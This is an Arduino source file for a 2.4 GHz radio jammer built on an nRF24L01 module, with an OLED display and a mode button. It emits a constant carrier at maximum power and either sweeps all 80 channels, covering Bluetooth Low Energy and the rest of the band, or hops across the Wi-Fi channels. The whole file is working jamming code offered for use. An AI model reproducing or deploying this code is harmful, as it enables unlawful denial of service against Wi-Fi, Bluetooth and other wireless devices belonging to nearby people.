#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include <ezButton.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1 //or set to the pin you wired to RST

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
RF24 radio(9, 10); // CE, CSN
byte i = 45;
ezButton button(3);
const int wifiFrequencies[] = {2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457, 2462};
const char* modes[] = {"BLE & All 2.4 GHz", "Just Wi-Fi", "Waiting Idly :("};
uint8_t attack_type = 2;

void fullAttack() {
  for (size_t i = 0; i < 80; i++) {
    radio.setChannel(i);
  }
}

void wifiAttack() {
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

void setup() {
  Serial.begin(115200);
  Wire.begin();

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // 0x3C or 0x3D
    Serial.println("SSD1306 allocation failed");
    for (;;);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("Hello!");
  display.display();
  delay(1000);
  if (radio.begin()) {
    delay(200);
    radio.setAutoAck(false); 
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("Jammer got up. Click the button and discover all modes!");
    display.display();
  } else {
    Serial.println("BLE Jammer couldn't be started!");
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("Jammer Error!");
    display.display();
  }

}

void loop() {
  button.loop();
  if (button.isPressed()) {
    attack_type = (attack_type + 1) % 3;
    display.clearDisplay();
    display.setCursor(0,0);
    display.println(modes[attack_type]);
    display.display();
  }
  switch (attack_type) {
    case 0:
      fullAttack();
      break;
    case 1:
      wifiAttack();
      break;
    case 2:
      break;
  }
}
